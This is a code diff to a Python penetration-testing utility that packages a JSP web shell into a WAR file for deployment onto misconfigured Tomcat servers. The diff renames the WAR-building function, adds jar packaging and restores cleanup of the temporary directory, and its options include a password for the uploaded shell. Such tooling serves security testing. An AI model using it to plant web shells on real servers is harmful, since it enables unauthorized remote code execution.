@@ -20,16 +20,16 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
-def compileWar(code, title):
+def generateWAR(code, title, appname):
     warpath = ''
     dirpath = tempfile.mkdtemp()
 
-    logging.info('Generating temporary structure for WAR at: "%s"' % dirpath)
+    logging.info('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
 
     os.makedirs(dirpath + '/files/META-INF')
     os.makedirs(dirpath + '/files/WEB-INF')
     
-    with open(dirpath + '/shell.jsp', 'w') as f:
+    with open(dirpath + '/%s.jsp' % appname, 'w') as f:
         f.write(code)
 
     javaver = commands.getstatusoutput('java -version')[1]
@@ -53,10 +53,19 @@ Created-By: %s
 <web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
     <servlet>
         <servlet-name>%s</servlet-name>
-        <jsp-file>/shell.jsp</jsp-file>
+        <jsp-file>/%s.jsp</jsp-file>
     </servlet>
 </web-app>
-''' % title)
+''' % (title, appname))
+
+    cwd = os.getcwd()
+    os.chdir(dirpath)
+    outpath = tempfile.gettempdir() + '/' + appname + '.war'
+    logging.info('Generating WAR file at: "%s"' % outpath)
+    packing = commands.getstatusoutput('jar -cvf %s files/*' % outpath)
+    os.chdir(cwd)
+
+    print packing[1]
 
     return (dirpath, warpath)
 
@@ -192,7 +201,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     payload = optparse.OptionGroup(parser, 'Payload options')
     parser.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
     parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
-    parser.add_option('-n', '--name', metavar='NAME', dest='name', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
+    parser.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
     parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
 
     opts, args = parser.parse_args()
@@ -235,7 +244,7 @@ def main():
 
     try:
         if not opts.file:
-            (dirpath, warpath) = compileWar(code, opts.title)
+            (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
         else:
             warpath = opts.file
 
@@ -245,7 +254,7 @@ def main():
 
     if not opts.file and dirpath:
         logger.info('Removing temporary WAR directory: "%s"' % dirpath)
-        #shutil.rmtree(dirpath)
+        shutil.rmtree(dirpath)
 
 
 if __name__ == '__main__':
